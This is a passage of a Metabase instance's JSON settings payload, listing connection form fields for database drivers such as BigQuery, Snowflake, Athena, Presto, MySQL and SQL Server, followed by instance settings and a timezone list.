"placeholder": "1w08oDRKPrOqBt06yxY8uiCz2sSvOp3u"

}, {

"name": "service-account-json",

"display-name": "Service account JSON file",

"helper-text": "This JSON file contains the credentials Metabase needs to read and query your dataset.",

"required": true,

"type": "textFile"

}, {

"name": "dataset-filters-type",

"display-name": "Datasets",

"type": "select",

"options": [{

"name": "All",

"value": "all"

}, {

"name": "Only these...",

"value": "inclusion"

}, {

"name": "All except...",

"value": "exclusion"

}],

"default": "all"

}, {

"name": "dataset-filters-patterns",

"type": "text",

"placeholder": "E.x. public,auth*",

"description": "Comma separated names of datasets that should appear in Metabase",

"visible-if": {

"dataset-filters-type": "inclusion"

},

"helper-text": "You can use patterns like \"auth*\" to match multiple datasets",

"required": true

}, {

"name": "dataset-filters-patterns",

"type": "text",

"placeholder": "E.x. public,auth*",

"description": "Comma separated names of datasets that should NOT appear in Metabase",

"visible-if": {

"dataset-filters-type": "exclusion"

},

"helper-text": "You can use patterns like \"auth*\" to match multiple datasets",

"required": true

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "use-jvm-timezone",

"display-name": "Use JVM Time Zone",

"default": false,

"type": "boolean",

"visible-if": {

"advanced-options": true

}

}, {

"name": "include-user-id-and-hash",

"display-name": "Include User ID and query hash in queries",

"default": true,

"type": "boolean",

"visible-if": {

"advanced-options": true

}

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "BigQuery",

"superseded-by": null

},

"snowflake": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "account",

"display-name": "Account name",

"helper-text": "Enter your Account ID with the region that your Snowflake cluster is running on e.g. \"xxxxxxxx.us-east-2.aws\". Some regions don't have this suffix.",

"placeholder": "xxxxxxxx.us-east-2.aws",

"required": true

}, {

"name": "user",

"display-name": "Username",

"placeholder": "username",

"required": true

}, {

"name": "password",

"display-name": "Password",

"type": "password",

"placeholder": "••••••••"

}, {

"name": "private-key-options",

"display-name": "RSA private key (PKCS#8/.p8)",

"type": "select",

"options": [{

"name": "Local file path",

"value": "local"

}, {

"name": "Uploaded file path",

"value": "uploaded"

}],

"default": "local"

}, {

"name": "private-key-value",

"type": "textFile",

"treat-before-posting": "base64",

"visible-if": {

"private-key-options": "uploaded"

}

}, {

"name": "private-key-path",

"type": "string",

"display-name": "File path",

"placeholder": null,

"visible-if": {

"private-key-options": "local"

}

}, {

"name": "warehouse",

"display-name": "Warehouse",

"helper-text": "If your user doesn't have a default warehouse, enter the warehouse to connect to.",

"placeholder": "birds_main",

"required": true

}, {

"name": "db",

"display-name": "Database name (case sensitive)",

"placeholder": "birds_of_the_world",

"required": true

}, {

"name": "schema-filters-type",

"display-name": "Schemas",

"type": "select",

"options": [{

"name": "All",

"value": "all"

}, {

"name": "Only these...",

"value": "inclusion"

}, {

"name": "All except...",

"value": "exclusion"

}],

"default": "all"

}, {

"name": "schema-filters-patterns",

"type": "text",

"placeholder": "E.x. public,auth*",

"description": "Comma separated names of schemas that should appear in Metabase",

"visible-if": {

"schema-filters-type": "inclusion"

},

"helper-text": "You can use patterns like \"auth*\" to match multiple schemas",

"required": true

}, {

"name": "schema-filters-patterns",

"type": "text",

"placeholder": "E.x. public,auth*",

"description": "Comma separated names of schemas that should NOT appear in Metabase",

"visible-if": {

"schema-filters-type": "exclusion"

},

"helper-text": "You can use patterns like \"auth*\" to match multiple schemas",

"required": true

}, {

"name": "role",

"display-name": "Role (optional)",

"helper-text": "Specify a role to override the database user’s default role.",

"placeholder": "user"

}, {

"name": "tunnel-enabled",

"display-name": "Use an SSH tunnel",

"placeholder": "Enable this SSH tunnel?",

"type": "boolean",

"default": false

}, {

"name": "tunnel-host",

"display-name": "SSH tunnel host",

"helper-text": "The hostname that you use to connect to SSH tunnels.",

"placeholder": "hostname",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-port",

"display-name": "SSH tunnel port",

"type": "integer",

"default": 22,

"required": false,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-user",

"display-name": "SSH tunnel username",

"helper-text": "The username you use to login to your SSH tunnel.",

"placeholder": "username",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-auth-option",

"display-name": "SSH Authentication",

"type": "select",

"options": [{

"name": "SSH Key",

"value": "ssh-key"

}, {

"name": "Password",

"value": "password"

}],

"default": "ssh-key",

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-pass",

"display-name": "SSH tunnel password",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "password"

}

}, {

"name": "tunnel-private-key",

"display-name": "SSH private key to connect to the tunnel",

"type": "string",

"placeholder": "Paste the contents of an SSH private key here",

"required": true,

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "tunnel-private-key-passphrase",

"display-name": "Passphrase for SSH private key",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "additional-options",

"display-name": "Additional JDBC connection string options",

"visible-if": {

"advanced-options": true

},

"placeholder": "queryTimeout=0"

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "Snowflake",

"superseded-by": null

},

"athena": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "region",

"display-name": "Region",

"default": "us-east-1"

}, {

"name": "workgroup",

"display-name": "Workgroup",

"default": "primary"

}, {

"name": "s3_staging_dir",

"display-name": "S3 staging directory",

"helper-text": "This S3 staging directory must be in the same region you specify above.",

"default": "s3://your_bucket"

}, {

"name": "catalog",

"display-name": "Catalog",

"placeholder": "AwsDataCatalog",

"required": false,

"helper-text": "Use a different data catalog (if you have federated queries, for example)"

}, {

"name": "access_key",

"display-name": "Access key",

"helper-text": "Leave this empty to authorize using AWS Credentials Provider Chain (Instance Profiles or IAM Roles for Tasks)"

}, {

"name": "secret_key",

"display-name": "Secret key",

"type": "password",

"placeholder": "••••••••",

"helper-text": "Leave this empty to authorize using AWS Credentials Provider Chain (Instance Profiles or IAM Roles for Tasks)"

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "additional-options",

"display-name": "Additional Athena connection string options",

"visible-if": {

"advanced-options": true

},

"placeholder": "UseResultsetStreaming=0;LogLevel=6"

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "Amazon Athena",

"superseded-by": null

},

"presto-jdbc": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "host",

"display-name": "Host",

"helper-text": "Your databases IP address (e.g. 98.137.149.56) or its domain name (e.g. esc.mydatabase.com).",

"placeholder": "name.database.com"

}, {

"name": "port",

"display-name": "Port",

"type": "integer",

"default": 8080

}, {

"name": "catalog",

"display-name": "Catalog",

"placeholder": "european_birds",

"required": false,

"helper-text": "Presto Catalogs contain schemas and reference data sources via a connector."

}, {

"name": "schema",

"display-name": "Schema (optional)",

"helper-text": "Only add tables to Metabase that come from a specific schema.",

"placeholder": "just_crows",

"required": false

}, {

"name": "user",

"display-name": "Username",

"placeholder": "username",

"required": false

}, {

"name": "password",

"display-name": "Password",

"type": "password",

"placeholder": "••••••••",

"required": false

}, {

"name": "ssl",

"display-name": "Use a secure connection (SSL)",

"type": "boolean",

"default": false

}, {

"name": "ssl-use-keystore",

"display-name": "Use SSL server certificate?",

"type": "boolean",

"visible-if": {

"ssl": true

}

}, {

"name": "ssl-keystore-options",

"display-name": "Keystore",

"type": "select",

"options": [{

"name": "Local file path",

"value": "local"

}, {

"name": "Uploaded file path",

"value": "uploaded"

}],

"default": "local",

"visible-if": {

"ssl": true,

"ssl-use-keystore": true

}

}, {

"name": "ssl-keystore-value",

"type": "textFile",

"treat-before-posting": "base64",

"visible-if": {

"ssl": true,

"ssl-use-keystore": true,

"ssl-keystore-options": "uploaded"

}

}, {

"name": "ssl-keystore-path",

"type": "string",

"display-name": "File path",

"placeholder": "/path/to/keystore.jks",

"visible-if": {

"ssl": true,

"ssl-use-keystore": true,

"ssl-keystore-options": "local"

}

}, {

"name": "ssl-keystore-password-value",

"display-name": "Keystore password",

"type": "password",

"required": false,

"visible-if": {

"ssl": true,

"ssl-use-keystore": true

}

}, {

"name": "ssl-use-truststore",

"display-name": "Use SSL truststore?",

"type": "boolean",

"visible-if": {

"ssl": true

}

}, {

"name": "ssl-truststore-options",

"display-name": "Truststore",

"type": "select",

"options": [{

"name": "Local file path",

"value": "local"

}, {

"name": "Uploaded file path",

"value": "uploaded"

}],

"default": "local",

"visible-if": {

"ssl": true,

"ssl-use-truststore": true

}

}, {

"name": "ssl-truststore-value",

"type": "textFile",

"treat-before-posting": "base64",

"visible-if": {

"ssl": true,

"ssl-use-truststore": true,

"ssl-truststore-options": "uploaded"

}

}, {

"name": "ssl-truststore-path",

"type": "string",

"display-name": "File path",

"placeholder": "/path/to/truststore.jks",

"visible-if": {

"ssl": true,

"ssl-use-truststore": true,

"ssl-truststore-options": "local"

}

}, {

"name": "ssl-truststore-password-value",

"display-name": "Truststore password",

"type": "password",

"required": false,

"visible-if": {

"ssl": true,

"ssl-use-truststore": true

}

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "kerberos",

"type": "boolean",

"display-name": "Authenticate with Kerberos",

"default": false,

"visible-if": {

"advanced-options": true

}

}, {

"name": "kerberos-principal",

"display-name": "Kerberos principal",

"placeholder": "service/instance@REALM",

"required": false,

"visible-if": {

"advanced-options": true,

"kerberos": true

}

}, {

"name": "kerberos-remote-service-name",

"display-name": "Kerberos coordinator service",

"placeholder": "presto",

"required": false,

"visible-if": {

"advanced-options": true,

"kerberos": true

}

}, {

"name": "kerberos-use-canonical-hostname",

"type": "boolean",

"display-name": "Use canonical hostname",

"default": false,

"required": false,

"visible-if": {

"advanced-options": true,

"kerberos": true

}

}, {

"name": "kerberos-credential-cache-path",

"display-name": "Kerberos credential cache file",

"placeholder": "/tmp/kerberos-credential-cache",

"required": false,

"visible-if": {

"advanced-options": true,

"kerberos": true

}

}, {

"name": "kerberos-keytab-path",

"display-name": "Kerberos keytab file",

"placeholder": "/path/to/kerberos.keytab",

"required": false,

"visible-if": {

"advanced-options": true,

"kerberos": true

}

}, {

"name": "kerberos-config-path",

"display-name": "Kerberos configuration file",

"placeholder": "/etc/krb5.conf",

"required": false,

"visible-if": {

"advanced-options": true,

"kerberos": true

}

}, {

"name": "kerberos-service-principal-pattern",

"display-name": "Presto coordinator Kerberos service principal pattern",

"placeholder": "${SERVICE}@${HOST}. ${SERVICE}",

"required": false,

"visible-if": {

"advanced-options": true,

"kerberos": true

}

}, {

"name": "additional-options",

"display-name": "Additional JDBC options",

"placeholder": "SSLKeyStorePath=/path/to/keystore.jks&SSLKeyStorePassword=whatever",

"required": false,

"visible-if": {

"advanced-options": true

}

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "Presto",

"superseded-by": null

},

"h2": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "db",

"display-name": "Connection String",

"helper-text": "The local path relative to where Metabase is running from. Your string should not include the .mv.db extension.",

"placeholder": "file:/Users/camsaul/bird_sightings/toucans",

"required": true

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "H2",

"superseded-by": null

},

"sqlite": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "db",

"display-name": "Filename",

"placeholder": "/home/camsaul/toucan_sightings.sqlite",

"required": true

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "SQLite",

"superseded-by": null

},

"mysql": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "host",

"display-name": "Host",

"helper-text": "Your databases IP address (e.g. 98.137.149.56) or its domain name (e.g. esc.mydatabase.com).",

"placeholder": "name.database.com"

}, {

"name": "port",

"display-name": "Port",

"type": "integer",

"placeholder": 3306

}, {

"name": "dbname",

"display-name": "Database name",

"placeholder": "birds_of_the_world",

"required": true

}, {

"name": "user",

"display-name": "Username",

"placeholder": "username",

"required": true

}, {

"name": "password",

"display-name": "Password",

"type": "password",

"placeholder": "••••••••"

}, {

"name": "ssl",

"display-name": "Use a secure connection (SSL)",

"type": "boolean",

"default": false

}, {

"name": "ssl-cert",

"display-name": "Server SSL certificate chain",

"placeholder": "",

"visible-if": {

"ssl": true

}

}, {

"name": "tunnel-enabled",

"display-name": "Use an SSH tunnel",

"placeholder": "Enable this SSH tunnel?",

"type": "boolean",

"default": false

}, {

"name": "tunnel-host",

"display-name": "SSH tunnel host",

"helper-text": "The hostname that you use to connect to SSH tunnels.",

"placeholder": "hostname",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-port",

"display-name": "SSH tunnel port",

"type": "integer",

"default": 22,

"required": false,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-user",

"display-name": "SSH tunnel username",

"helper-text": "The username you use to login to your SSH tunnel.",

"placeholder": "username",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-auth-option",

"display-name": "SSH Authentication",

"type": "select",

"options": [{

"name": "SSH Key",

"value": "ssh-key"

}, {

"name": "Password",

"value": "password"

}],

"default": "ssh-key",

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-pass",

"display-name": "SSH tunnel password",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "password"

}

}, {

"name": "tunnel-private-key",

"display-name": "SSH private key to connect to the tunnel",

"type": "string",

"placeholder": "Paste the contents of an SSH private key here",

"required": true,

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "tunnel-private-key-passphrase",

"display-name": "Passphrase for SSH private key",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "json-unfolding",

"display-name": "Unfold JSON Columns",

"type": "boolean",

"visible-if": {

"advanced-options": true

},

"description": "We unfold JSON columns into component fields.This is on by default but you can turn it off if performance is slow.",

"default": true

}, {

"name": "additional-options",

"display-name": "Additional JDBC connection string options",

"visible-if": {

"advanced-options": true

},

"placeholder": "tinyInt1isBit=false"

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "MySQL",

"superseded-by": null

},

"sqlserver": {

"source": {

"type": "official",

"contact": null

},

"details-fields": [{

"name": "host",

"display-name": "Host",

"helper-text": "Your databases IP address (e.g. 98.137.149.56) or its domain name (e.g. esc.mydatabase.com).",

"placeholder": "name.database.com"

}, {

"name": "port",

"display-name": "Port",

"type": "integer",

"description": "Leave empty to use Dynamic Ports, or input specific port. Standard port is 1433."

}, {

"name": "db",

"display-name": "Database name",

"placeholder": "BirdsOfTheWorld",

"required": true

}, {

"name": "instance",

"display-name": "Database instance name",

"placeholder": "N/A"

}, {

"name": "user",

"display-name": "Username",

"placeholder": "username",

"required": true

}, {

"name": "password",

"display-name": "Password",

"type": "password",

"placeholder": "••••••••"

}, {

"name": "ssl",

"display-name": "Use a secure connection (SSL)",

"type": "boolean",

"default": false

}, {

"name": "rowcount-override",

"display-name": "ROWCOUNT Override",

"placeholder": 0,

"required": false

}, {

"name": "tunnel-enabled",

"display-name": "Use an SSH tunnel",

"placeholder": "Enable this SSH tunnel?",

"type": "boolean",

"default": false

}, {

"name": "tunnel-host",

"display-name": "SSH tunnel host",

"helper-text": "The hostname that you use to connect to SSH tunnels.",

"placeholder": "hostname",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-port",

"display-name": "SSH tunnel port",

"type": "integer",

"default": 22,

"required": false,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-user",

"display-name": "SSH tunnel username",

"helper-text": "The username you use to login to your SSH tunnel.",

"placeholder": "username",

"required": true,

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-auth-option",

"display-name": "SSH Authentication",

"type": "select",

"options": [{

"name": "SSH Key",

"value": "ssh-key"

}, {

"name": "Password",

"value": "password"

}],

"default": "ssh-key",

"visible-if": {

"tunnel-enabled": true

}

}, {

"name": "tunnel-pass",

"display-name": "SSH tunnel password",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "password"

}

}, {

"name": "tunnel-private-key",

"display-name": "SSH private key to connect to the tunnel",

"type": "string",

"placeholder": "Paste the contents of an SSH private key here",

"required": true,

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "tunnel-private-key-passphrase",

"display-name": "Passphrase for SSH private key",

"type": "password",

"placeholder": "******",

"visible-if": {

"tunnel-enabled": true,

"tunnel-auth-option": "ssh-key"

}

}, {

"name": "advanced-options",

"type": "section",

"default": false

}, {

"name": "additional-options",

"display-name": "Additional JDBC connection string options",

"visible-if": {

"advanced-options": true

},

"placeholder": "trustServerCertificate=false"

}, {

"name": "auto_run_queries",

"type": "boolean",

"default": true,

"display-name": "Rerun queries for simple explorations",

"description": "We execute the underlying query when you explore data using Summarize or Filter. This is on by default but you can turn it off if performance is slow.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "let-user-control-scheduling",

"type": "boolean",

"display-name": "Choose when syncs and scans happen",

"description": "By default, Metabase does a lightweight hourly sync and an intensive daily scan of field values. If you have a large database, turn this on to make changes.",

"visible-if": {

"advanced-options": true

}

}, {

"name": "schedules.metadata_sync",

"display-name": "Database syncing",

"description": "This is a lightweight process that checks for updates to this database’s schema. In most cases, you should be fine leaving this set to sync hourly.",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "schedules.cache_field_values",

"display-name": "Scanning for Filter Values",

"description": "Metabase can scan the values present in each field in this database to enable checkbox filters in dashboards and questions. This can be a somewhat resource-intensive process, particularly if you have a very large database. When should Metabase automatically scan and cache field values?",

"visible-if": {

"advanced-options": true,

"let-user-control-scheduling": true

}

}, {

"name": "refingerprint",

"type": "boolean",

"display-name": "Periodically refingerprint tables",

"description": "This enables Metabase to scan for additional field values during syncs allowing smarter behavior, like improved auto-binning on your bar charts.",

"visible-if": {

"advanced-options": true

}

}],

"driver-name": "SQL Server",

"superseded-by": null

}

},

"has-user-setup": true,

"enable-advanced-config?": false,

"ga-code": "UA-60817802-1",

"enable-enhancements?": false,

"native-query-autocomplete-match-style": "substring",

"site-locale": "en",

"token-features": {

"sso": false,

"whitelabel": false,

"sandboxes": false,

"hosting": false,

"advanced_config": false,

"embedding": false,

"content_management": false,

"advanced_permissions": false,

"audit_app": false

},

"report-timezone-short": "GMT",

"report-timezone-long": "GMT",

"application-name": "Metabase",

"embedding-app-origin": null,

"ga-enabled": false,

"email-configured?": false,

"snowplow-available": true,

"enable-advanced-permissions?": false,

"snowplow-url": "[https://sp.metabase.com](https://sp.metabase.com)",

"ldap-configured?": false,

"session-cookies": null,

"site-url": "[http://127.0.0.1:3000](http://127.0.0.1:3000)",

"analytics-uuid": "a9f05e66-ef41-4811-a644-fde212051d7e",

"is-hosted?": false,

"snowplow-enabled": false,

"enable-password-login": true,

"ldap-enabled": false,

"start-of-week": "sunday",

"custom-geojson": {

"us_states": {

"name": "United States",

"url": "app/assets/geojson/us-states.json",

"region_key": "STATE",

"region_name": "NAME",

"builtin": true

},

"world_countries": {

"name": "World",

"url": "app/assets/geojson/world.json",

"region_key": "ISO_A2",

"region_name": "NAME",

"builtin": true

}

},

"instance-creation": "2023-08-03T12:38:51.44Z",

"available-timezones": ["Africa/Abidjan", "Africa/Accra", "Africa/Addis_Ababa", "Africa/Algiers", "Africa/Asmara", "Africa/Asmera", "Africa/Bamako", "Africa/Bangui", "Africa/Banjul", "Africa/Bissau", "Africa/Blantyre", "Africa/Brazzaville", "Africa/Bujumbura", "Africa/Cairo", "Africa/Casablanca", "Africa/Ceuta", "Africa/Conakry", "Africa/Dakar", "Africa/Dar_es_Salaam", "Africa/Djibouti", "Africa/Douala", "Africa/El_Aaiun", "Africa/Freetown", "Africa/Gaborone", "Africa/Harare", "Africa/Johannesburg", "Africa/Juba", "Africa/Kampala", "Africa/Khartoum", "Africa/Kigali", "Africa/Kinshasa", "Africa/Lagos", "Africa/Libreville", "Africa/Lome", "Africa/Luanda", "Africa/Lubumbashi", "Africa/Lusaka", "Africa/Malabo", "Africa/Maputo", "Africa/Maseru", "Africa/Mbabane", "Africa/Mogadishu", "Africa/Monrovia", "Africa/Nairobi", "Africa/Ndjamena", "Africa/Niamey", "Africa/Nouakchott", "Africa/Ouagadougou", "Africa/Porto-Novo", "Africa/Sao_Tome", "Africa/Timbuktu", "Africa/Tripoli", "Africa/Tunis", "Africa/Windhoek", "America/Adak", "America/Anchorage", "America/Anguilla", "America/Antigua", "America/Araguaina", "America/Argentina/Buenos_Aires", "America/Argentina/Catamarca", "America/Argentina/ComodRivadavia", "America/Argentina/Cordoba", "America/Argentina/Jujuy", "America/Argentina/La_Rioja", "America/Argentina/Mendoza", "America/Argentina/Rio_Gallegos", "America/Argentina/Salta", "America/Argentina/San_Juan", "America/Argentina/San_Luis", "America/Argentina/Tucuman", "America/Argentina/Ushuaia", "America/Aruba", "America/Asuncion", "America/Atikokan", "America/Atka", "America/Bahia", 